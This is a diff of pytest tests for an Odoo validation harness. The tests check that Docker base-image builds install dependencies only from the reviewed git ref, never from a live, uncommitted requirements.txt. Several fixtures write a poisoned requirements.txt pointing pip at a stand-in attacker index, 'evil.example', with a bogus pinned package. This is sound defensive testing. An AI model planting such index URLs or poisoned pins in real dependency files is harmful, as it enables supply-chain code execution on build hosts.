@@ -36,6 +36,32 @@ Confirmed defects being closed here:
   tee/PIPESTATUS mechanism (`set +e; ... | tee "$LOG"; rc=${PIPESTATUS[0]};
   set -e; if [ "$rc" -ne 0 ] || grep -qiE "$FAIL_RE" "$LOG"; then ...`).
 
+  DEFECT 3 (HIGH/LIVE, R8-red12 finding 1): prepare-base-db.sh sourced
+  requirements.txt from the LIVE $PROJECT root, NOT the reviewed snapshot --
+  even when called with PREPARE_BASE_ADDONS_DIR pointing at an already-
+  materialized, ref-pinned snapshot (DEFECT 1's fix). requirements.txt content
+  becomes `pip3 install -r` in the Dockerfile build of the SHARED base/
+  base_demo image every later validate-warm/validate-full run reuses, so a
+  live/uncommitted poison line (a malicious --index-url, a VCS/URL
+  requirement, a poisoned pin) got build-time-executed even though it was
+  never part of the reviewed ref -- same "validate live, not reviewed ref"
+  class as DEFECT 1, one field over, with a worse blast radius (build-time
+  RCE, not just a smuggled module).
+
+  Fix: validate-warm.sh/validate-odoo.sh/validate-full.sh's (byte-identical)
+  harness_materialize_tree() now ALSO materializes requirements.txt (if
+  present at the ref) via the same filter-immune `git cat-file blob` path as
+  custom-addons/**, as a SIBLING of the snapshot's custom-addons/ dir.
+  prepare-base-db.sh derives `PREPARE_BASE_REQUIREMENTS` (default:
+  `dirname(PROJECT_ADDONS)/requirements.txt`) and reads ONLY that path -- for
+  the standalone/default caller this is byte-identical to the old
+  "$PROJECT/requirements.txt"; for validate-full.sh's ODOO_DEMO_REBUILD caller
+  (which already passes PREPARE_BASE_ADDONS_DIR="$PROJECT_ADDONS", the
+  materialized snapshot) it resolves to the snapshot's own requirements.txt
+  with NO further call-site change needed. A ref with no requirements.txt at
+  all fails closed into the pre-existing manifest-derived branch (zero live
+  bytes read), never a silent fall-back to the live file.
+
 These tests are hermetic: `docker` is a small scripted fake binary on PATH
 (never a real daemon, matching the pattern in
 tests/test_odoo_warm_cache_provenance_defense2.py) that logs every invocation
@@ -185,7 +211,10 @@ def _base_env(fake_bin: Path, docker_log: Path, extra: dict | None = None) -> di
     env = os.environ.copy()
     env["PATH"] = f"{fake_bin}:{env.get('PATH', '')}"
     env["DOCKER_CALL_LOG"] = str(docker_log)
-    for k in ("FAKE_DOCKER_RUN_EXIT", "FAKE_DOCKER_RUN_OUTPUT", "PREPARE_BASE_ADDONS_DIR"):
+    for k in (
+        "FAKE_DOCKER_RUN_EXIT", "FAKE_DOCKER_RUN_OUTPUT", "PREPARE_BASE_ADDONS_DIR",
+        "PREPARE_BASE_REQUIREMENTS",
+    ):
         env.pop(k, None)
     if extra:
         env.update(extra)
@@ -454,3 +483,184 @@ def test_old_install_check_would_have_passed_on_a_fail_re_log_with_rc0(tmp_path)
         "control is no longer discriminating"
     )
     assert "'base' ready" in result.stdout, result.stdout
+
+
+# ==========================================================================
+# DEFECT 3 (AUD-RCE1) -- requirements.txt must come from the REVIEWED ref
+# (never the live $PROJECT/requirements.txt) on any ref-scoped rebuild path.
+# ==========================================================================
+def test_validate_full_demo_rebuild_deps_come_from_reviewed_ref_not_live_poison(tmp_path):
+    """AUD-RCE1 core proof, full pipe: validate-full.sh's ODOO_DEMO_REBUILD path
+    materializes the REVIEWED (HEAD) ref's custom-addons AND requirements.txt into a
+    snapshot, then hands prepare-base-db.sh PREPARE_BASE_ADDONS_DIR pointing at it (no
+    other override). The LIVE, uncommitted requirements.txt differs from HEAD's and
+    carries a poison line (a malicious --index-url + a bogus pinned package) -- it must
+    NEVER reach the deps file that becomes `pip3 install -r`, only the REVIEWED content
+    may."""
+    project = tmp_path / "project"
+    _init_repo(project)
+    _make_module(
+        project / "custom-addons", "mod1",
+        {"demo/mod1_demo.xml": "<odoo><data></data></odoo>\n"},
+    )
+    (project / "requirements.txt").write_text("cleanpkg==1.0\n", encoding="utf-8")
+    _commit_all(project, "base (mod1 + clean, reviewed requirements.txt)")
+
+    # Uncommitted, LIVE-only changes: a demo/ edit (triggers the rebuild path) AND a
+    # poisoned requirements.txt that differs from the committed (reviewed) one.
+    (project / "custom-addons" / "mod1" / "demo" / "mod1_demo.xml").write_text(
+        "<odoo><data>changed</data></odoo>\n", encoding="utf-8"
+    )
+    (project / "requirements.txt").write_text(
+        "--index-url http://evil.example/simple\nevilpkg==9.9.9\n", encoding="utf-8"
+    )
+
+    harness = _copy_harness(tmp_path)
+    docker_log = tmp_path / "docker.log"
+    fake_bin = _fake_docker_bin(tmp_path, docker_log)
+    env = _base_env(fake_bin, docker_log, {
+        "HARNESS_LOCK_FILE": str(tmp_path / "lock"),
+        "SKIP_TEST_PASS": "1",       # isolate to the demo-rebuild path only
+        "ODOO_DEMO_REBUILD": "1",
+    })
+
+    result = subprocess.run(
+        ["bash", str(harness / "validate-full.sh"), str(project)],
+        cwd=harness,
+        env=env,
+        text=True,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.STDOUT,
+        check=False,
+    )
+
+    assert result.returncode == 0, result.stdout
+    assert "demo-pass(rebuild) PASS" in result.stdout, result.stdout
+
+    deps = (harness / ".deps.txt").read_text(encoding="utf-8")
+    assert "evilpkg" not in deps, f"live poison leaked into .deps.txt:\n{deps}"
+    assert "evil.example" not in deps, (
+        f"live poison --index-url leaked into .deps.txt:\n{deps}"
+    )
+    assert "cleanpkg" in deps, (
+        f"the REVIEWED ref's requirements.txt did not flow to .deps.txt:\n{deps}"
+    )
+    assert str(project / "requirements.txt") not in result.stdout, (
+        "prepare-base-db.sh reported reading the LIVE $PROJECT/requirements.txt during a "
+        f"ref-scoped rebuild. stdout:\n{result.stdout}"
+    )
+
+
+def test_prepare_base_db_ref_with_no_requirements_txt_fails_closed_never_live(tmp_path):
+    """AUD-RCE1 fail-closed proof: PREPARE_BASE_ADDONS_DIR points at a snapshot whose
+    root has NO requirements.txt (a reviewed ref that genuinely carries none), while the
+    LIVE project root has one, and it is poisoned. The build must NEVER read the live
+    file -- it falls back to the manifest-derived (here: empty) deps, exactly the safe
+    state a project that has simply never had a requirements.txt is already in. This is
+    the deliberate choice over a LOUD refusal: an absent requirements.txt at the ref is
+    indistinguishable from, and exactly as safe as, "this project never needed one" --
+    the pre-existing default behavior for every caller before this fix."""
+    project = tmp_path / "project"
+    _make_module(project / "custom-addons", "mod1")
+    (project / "requirements.txt").write_text(
+        "--index-url http://evil.example/simple\nevilpkg==9.9.9\n", encoding="utf-8"
+    )
+
+    snapshot_addons = tmp_path / "snapshot" / "custom-addons"
+    _make_module(snapshot_addons, "mod1")
+    # Deliberately NO snapshot/requirements.txt -- the reviewed ref/snapshot has none.
+
+    harness = _copy_harness(tmp_path)
+    docker_log = tmp_path / "docker.log"
+    fake_bin = _fake_docker_bin(tmp_path, docker_log)
+    env = _base_env(fake_bin, docker_log, {
+        "HARNESS_LOCK_FILE": str(tmp_path / "lock"),
+        "PREPARE_BASE_ADDONS_DIR": str(snapshot_addons),
+    })
+
+    result = _run_prepare_base_db(project, harness, env)
+
+    assert result.returncode == 0, result.stdout
+    assert "'base' ready" in result.stdout, result.stdout
+    assert "deps source: custom-addons manifests" in result.stdout, result.stdout
+    assert str(project / "requirements.txt") not in result.stdout, (
+        "prepare-base-db.sh referenced the LIVE requirements.txt despite the reviewed "
+        f"ref/snapshot having none. stdout:\n{result.stdout}"
+    )
+
+    deps = (harness / ".deps.txt").read_text(encoding="utf-8")
+    assert "evilpkg" not in deps and "evil.example" not in deps, (
+        "the live poisoned requirements.txt leaked into .deps.txt despite the reviewed "
+        f"ref having no requirements.txt. .deps.txt:\n{deps}"
+    )
+
+
+def test_prepare_base_db_default_still_reads_project_requirements_txt(tmp_path):
+    """Regression: a standalone/direct invocation (no PREPARE_BASE_ADDONS_DIR /
+    PREPARE_BASE_REQUIREMENTS override) must still read $PROJECT/requirements.txt
+    exactly as before the AUD-RCE1 fix, and a clean, matching requirements.txt still
+    builds."""
+    project = tmp_path / "project"
+    _make_module(project / "custom-addons", "mod1")
+    (project / "requirements.txt").write_text("cleanpkg==1.0\n", encoding="utf-8")
+
+    harness = _copy_harness(tmp_path)
+    docker_log = tmp_path / "docker.log"
+    fake_bin = _fake_docker_bin(tmp_path, docker_log)
+    env = _base_env(fake_bin, docker_log, {"HARNESS_LOCK_FILE": str(tmp_path / "lock")})
+
+    result = _run_prepare_base_db(project, harness, env)
+
+    assert result.returncode == 0, result.stdout
+    assert "'base' ready" in result.stdout, result.stdout
+    assert (
+        f"deps source: {project / 'requirements.txt'} (odoo.sh parity)" in result.stdout
+    ), result.stdout
+
+    deps = (harness / ".deps.txt").read_text(encoding="utf-8")
+    assert "cleanpkg" in deps, deps
+
+
+# Non-vacuousness control for DEFECT 3: the exact pre-fix deps derivation, embedded
+# literally (never fetched from git history) -- unconditional "$PROJECT/requirements.txt"
+# with no snapshot/reviewed-ref override of any kind.
+OLD_DEPS_DERIVATION_SH = """#!/usr/bin/env bash
+set -euo pipefail
+PROJECT="$1"
+HERE="$2"
+if [ -f "$PROJECT/requirements.txt" ]; then
+  tr -d '\\r' < "$PROJECT/requirements.txt" | grep -vE '^[[:space:]]*(#|$)' > "$HERE/.deps.txt" || true
+  echo "[base] deps source: $PROJECT/requirements.txt (odoo.sh parity)"
+else
+  : > "$HERE/.deps.txt"
+  echo "[base] deps source: custom-addons manifests (no root requirements.txt)"
+fi
+"""
+
+
+def test_old_deps_derivation_would_have_used_the_live_poisoned_requirements(tmp_path):
+    project = tmp_path / "project"
+    project.mkdir(parents=True, exist_ok=True)
+    (project / "requirements.txt").write_text(
+        "--index-url http://evil.example/simple\nevilpkg==9.9.9\n", encoding="utf-8"
+    )
+    here = tmp_path / "harness_old"
+    here.mkdir()
+
+    old_script = tmp_path / "old_deps_derivation.sh"
+    old_script.write_text(OLD_DEPS_DERIVATION_SH, encoding="utf-8")
+    old_script.chmod(old_script.stat().st_mode | stat.S_IXUSR)
+
+    # Even with no override available in the old logic at all (it never looked for one),
+    # the pre-fix unconditional "$PROJECT/requirements.txt" read still picks up the live,
+    # poisoned file -- proving DEFECT (AUD-RCE1) was real.
+    result = subprocess.run(
+        ["bash", str(old_script), str(project), str(here)],
+        text=True, capture_output=True, check=False,
+    )
+    assert result.returncode == 0, result.stdout + result.stderr
+    deps = (here / ".deps.txt").read_text(encoding="utf-8")
+    assert "evilpkg" in deps and "evil.example" in deps, (
+        "the embedded pre-fix logic no longer reproduces the live-requirements.txt leak "
+        f"-- this control is no longer discriminating. .deps.txt:\n{deps}"
+    )
